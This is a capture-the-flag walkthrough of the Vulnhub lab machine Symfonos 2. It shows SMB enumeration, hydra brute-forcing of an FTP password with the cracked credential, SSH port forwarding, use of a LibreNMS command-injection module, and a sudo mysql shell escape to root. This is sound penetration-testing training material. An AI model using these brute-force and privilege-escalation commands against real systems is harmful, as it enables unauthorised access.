---
title:     "Vulnhub - Symfonos 2"
tags: [medium,ftp, port_forward,smb,hydra,sudo]
---

Today, We are going to pwn Symfonos 2 by Zayotic from Vulnhub

## Description:

```
OSCP-like Intermediate real life based machine designed to teach the importance of understanding a vulnerability. SHOULD work for both VMware and Virtualbox.
```
Download Link : <https://www.vulnhub.com/entry/symfonos-2,331/>


Lets Begin with our Initial Scan

## Nmap Scan Results:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:71:B2:8E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m22s, deviation: 2h53m12s, median: 22s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2020-03-09T12:31:01-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-09T17:31:01
|_  start_date: N/A
```

Lot of Ports open, I started with ``smb``

## SMB :

We can use smbmap to see is there any files available.

 > smbmap - SMB enumeration tool

> -H HOST   		IP of host

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/1.png)

So ``anonymous`` is having ``log.txt`` in ``/backups`` which is readable.

There is a tool called ``smbclient`` which helps to access to the server.

> smbclient - ftp-like client to access SMB/CIFS resources on servers

I tried login with ``anonymous`` without password and it worked, Downloaded the ``log.txt`` to my machine.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/2.png)

``log.txt`` 

Its the ``smb`` configuration, the Interesting thing is 


shadow file is stored in /var/backups/shadow.bak
``
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
``


The exact path of the SMB share 
```
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
```
There is also FTP Conf file 

``root@symfonos2:~# cat /usr/local/etc/proftpd.conf``

So FTP is running under the user ``aeolus`` not anonymous.
```
# Set the user and group under which the server will run.
User				aeolus
Group				aeolus
```

## FTP :

We know the FTP is running under ``aeolus`` user but we don't have the password for it, So I started bruteforcing it using ``hydra``.

>hydra - a very fast network logon cracker which supports many different services


>hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.101

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/3.png)


``aeolus : sergioteamo ``

Its the same ``log.txt`` we got from ``SMB``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/4.png)

## SSH :

I used the same creds for ``ssh``

``aeolus : sergioteamo ``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/5.png)

## Privilege Escalation :

Uploaded My Enumeration script to the machine and found some ports are listening to the machine.

```
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
---
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
tcp    LISTEN     0      128    127.0.0.1:8080                  *:*                  
tcp    LISTEN     0      20     127.0.0.1:25                    *:*                  
---
```

```
Port 3306 - MySQL
Port 25 - SMTP
Port 8080 - Webpage (Maybe)
```
I confirmed it by using ``curl``, There is a login page.
```
aeolus@symfonos2:/tmp$ curl localhost:8080
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=http://localhost:8080/login" />

        <title>Redirecting to http://localhost:8080/login</title>
    </head>
    <body>
        Redirecting to <a href="http://localhost:8080/login">http://localhost:8080/login</a>.
    </body>
</html>You have new mail in /var/mail/aeolus
```

We can't see port 8080 directly so We need to do [Port Forward](https://en.wikipedia.org/wiki/Port_forwarding) by doing this we can access the webpage from our machine.

For that press ``~C`` will open ssh interactive shell and then ``-L 8081:127.0.0.1:8080`` Which port forward 8080 to 8081.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/6.png)

``http://127.0.0.1:8081/``

It's ``LibreNMS`` Login page.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/7.png)

I searched for any exploits available and found this.

>https://www.rapid7.com/db/modules/exploit/linux/http/librenms_addhost_cmd_inject

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/8.png)

Now we got ``cronus`` user shell.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/9.png)

The First thing I did is ``sudo -l`` 

```
$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```
Looks like ``mysql`` can run as root without password.

I searched in [GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)

> sudo mysql -e '\! /bin/sh'

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos2/10.png)


